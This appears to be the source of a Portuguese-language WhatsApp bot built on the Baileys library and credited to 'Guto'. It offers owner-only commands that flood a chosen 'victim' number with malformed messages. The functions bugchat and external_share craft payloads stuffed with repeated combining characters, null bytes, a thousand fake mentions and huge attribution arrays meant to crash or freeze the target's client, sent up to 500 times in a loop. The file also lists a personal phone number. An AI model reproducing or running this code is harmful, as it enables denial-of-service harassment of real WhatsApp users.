// BASE DO GUTO
// YouTube: @gutoxtazv9
// WhatsApp: +55 51 8992-6591
// Telegram: t.me/gutox9

// Use e modifique como quiser 🤝
// Só mantenha os créditos 😉

process.on('uncaughtException', console.error)

require("./gutoxtaz/config")

const { 
  generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage,
  generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage,
  prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType,
  useMultiFileAuthState, makeWASocket, makeInMemoryStore, fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore, tempo, Mimetype, useSingleFileAuthState, makeWaSocket
} = require("@whiskeysockets/baileys")

const fs = require('fs')
const util = require('util')
const path = require('path')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone')
const yts = require('yt-search')
const didyoumean = require('didyoumean')
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' })
const JSConfuser = require("js-confuser")
const crypto = require('crypto')
const os = require('os')




const mimetype = require('mime-types')

module.exports = async (uwu, m) => {
try {

if (m?.message?.protocolMessage) {
  return;
}

const from = m.key.remoteJid

var body = (m.mtype === 'interactiveResponseMessage')
  ? (() => {
      try {
        const flow = m.message?.interactiveResponseMessage?.nativeFlowResponseMessage;
        return JSON.parse(flow?.paramsJson || '{}').id || '';
      } catch (e) {
        return '';
      }
    })()
  : (m.mtype === 'conversation')
    ? m.message.conversation || ''
    : (m.mtype === 'imageMessage')
      ? m.message.imageMessage?.caption || ''
      : (m.mtype === 'videoMessage')
        ? m.message.videoMessage?.caption || ''
        : (m.mtype === 'extendedTextMessage')
          ? m.message.extendedTextMessage?.text || ''
          : (m.mtype === 'buttonsResponseMessage')
            ? m.message.buttonsResponseMessage?.selectedButtonId || ''
            : (m.mtype === 'listResponseMessage')
              ? m.message.listResponseMessage?.singleSelectReply?.selectedRowId || ''
              : (m.mtype === 'templateButtonReplyMessage')
                ? m.message.templateButtonReplyMessage?.selectedId || ''
                : (m.mtype === 'messageContextInfo')
                  ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text || '')
                  : '';

const { 
  smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl,
  hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom
} = require('./gutoxtaz/myfunc.js')

var budy = (typeof m.text == 'string' ? m.text : '')

var prefix = global.prefa
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
    ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
    : ""
  : global.prefa ?? global.prefix

const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")

const sender = m.key.fromMe
  ? (uwu.user.id.split(':')[0]+'@s.whatsapp.net' || uwu.user.id)
  : (m.key.participant || m.key.remoteJid)

const botNumber = await uwu.decodeJid(uwu.user.id)
const senderNumber = sender.split('@')[0]

const isCreator = (m && m.sender && [botNumber, ...global.owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)) || false;

const isDeveloper = (m && m.sender && global.owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)) || false;

const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)

const isGroup = from.endsWith("@g.us")

const groupMetadata = isGroup ? await uwu.groupMetadata(from) : ""
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : ''

const type = Object.keys(m.message)
  .find((key) => !["senderKeyDistributionMessage", "messageContextInfo"].includes(key))

const content = JSON.stringify(m.message)

const getExtension = async (type) => {
  return await mimetype.extension(type)
}

const getFileBuffer = async (mediakey, MediaType) => {
  const stream = await downloadContentFromMessage(mediakey, MediaType)

  let buffer = Buffer.from([])
  for await (const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
  }
  return buffer
}



//===============[BANCO DE DADOS]

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  return uwu.sendMessage(m.chat, { text, mentions }, { quoted: m })
}

import('chalk').then(chalk => {
  const c = chalk.default;
  console.log(
    c.bgWhite.black(' [SMS] '),
    c.bgBlue.white(` ${budy || m.mtype} `),
    '\n',
    c.green('De:'),
    c.yellow(pushname),
    c.gray(`(${m.sender})`),
    '\n',
    c.green(m.isGroup ? 'Grupo:' : 'Para:'),
    c.cyan(from),
    '\n' + c.gray('='.repeat(50))
  );
});



const enviarguto = (teks) => {
  uwu.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        externalAdReply: {
          title: botname,
          "thumbnail": ta,
          mediaType: 1,
        }
      }
    },
    { quoted: m }
  )
}

const ta = fs.readFileSync(`./gutoxtaz/menu.jpg`)

if (!uwu.public) {
  if (!isCreator) return
}

if (prefix && command) {

  let caseNames = getCaseNames();

  function getCaseNames() {
    const fs = require('fs');
    try {
      const data = fs.readFileSync('WhatsApp_bot.js', 'utf8');
      const casePattern = /case\s+'([^']+)'/g;
      const matches = data.match(casePattern);

      if (matches) {
        const caseNames = matches.map(match =>
          match.replace(/case\s+'([^']+)'/, '$1')
        );
        return caseNames;
      } else {
        return [];
      }

    } catch (err) {
      console.log('Há um erro:', err);
      return [];
    }
  }

  let noPrefix = command
  let mean = didyoumean(noPrefix, caseNames);
  let sim = similarity(noPrefix, mean);
  let similarityPercentage = parseInt(sim * 100);

  if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
    let response = `Desculpe, o comando que você enviou está incorreto. Talvez você quis dizer:\n\n•> ${prefix+mean}\n•> Semelhança: ${similarityPercentage}%`
    enviarguto(response)
  }
}

//=====================================\\





async function bugchat(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "uwu" + "ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ".repeat(1999),
                                jpegThumbnail: "",
                                caption: "ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ".repeat(1999),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await uwu.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
        






async function external_share(target) {
  try {
    let msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(9999)}\"}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1000 }, (_, y) => `555193871982${y + 1}@s.whatsapp.net`),
            remoteJid: "status@broadcast",
            statusAttributionType: "RESHARED_FROM_POST",
            isQuestion: true,
            statusAttributions: Array(199999).fill({ type: "EXTERNAL_SHARE" })
          }
        }
      },
      {}
    );
    await uwu.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  } catch (error) {
    console.log(error);
  }
}





switch(command) {





case 'atraso_status': {
if (!isCreator) return
if (!q) return enviarguto(`*exemplo:*\n\n*${prefix + command}* '+55 51 8992-6591'`);
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await uwu.onWhatsApp(Xreturn);
  if (victim == "555189926591") {
    return;
    }
    if (victim == "555189926591") {
    return;
    }
    if (victim == "+55 51 8992-6591") {
    return;
  }
  if (contactInfo.length == 0) {
    return enviarguto("esse número não existe");
  }
  enviarguto("*enviando....*");  
		for (let i = 0; i < 500; i++) {
     await external_share(Xreturn)
   }
  enviarguto("*✔️*");
	}
break;
		
		





case 'bugchat': {
if (!isCreator) return
if (!q) return enviarguto(`*exemplo:*\n\n*${prefix + command}* '+55 51 8992-6591'`);
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await uwu.onWhatsApp(Xreturn);
  if (victim == "555189926591") {
    return;
    }
    if (victim == "555189926591") {
    return;
    }
    if (victim == "+55 51 8992-6591") {
    return;
  }
  if (contactInfo.length == 0) {
    return enviarguto("esse número não existe");
  }
  enviarguto("*enviando....*");  
		for (let i = 0; i < 1; i++) {
     await bugchat(Xreturn)
     await sleep(2000);
   }
  enviarguto("*✔️*");
	}
break;
		



case 'menu': {
if (!isCreator) return
let menuMsg = `
╔═══〔 🤖 𝐌𝐄𝐍𝐔 🤖 〕═══╗

📡 𝐂𝐨𝐦𝐚𝐧𝐝𝐨𝐬:
╭───────────────╮
│ 👻 atraso_status +55 51 9999-9999
│ 💣 bugchat +55 51 9999-9999
│ ♻️ reiniciar_bot
╰───────────────╯

╚═══════════════════╝
`
await enviarguto(menuMsg, m)
}
break


case 'reiniciar_bot': {
  if (!isCreator) return;

  await uwu.sendMessage(from, {
    text: '♻️ Reiniciando o bot...'
  }, { quoted: m });

  process.exit();
}
break;


case 'g': { 
  const segundos = process.uptime();
  const uptime = `${Math.floor(segundos / 3600)}h ${Math.floor((segundos % 3600) / 60)}m ${Math.floor(segundos % 60)}s`;

  await uwu.sendMessage(from, {
    text: `⏱️ *tempo ativo:* ${uptime}`
  }, { quoted: m });
}
break;





























 
 
default: {
}
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})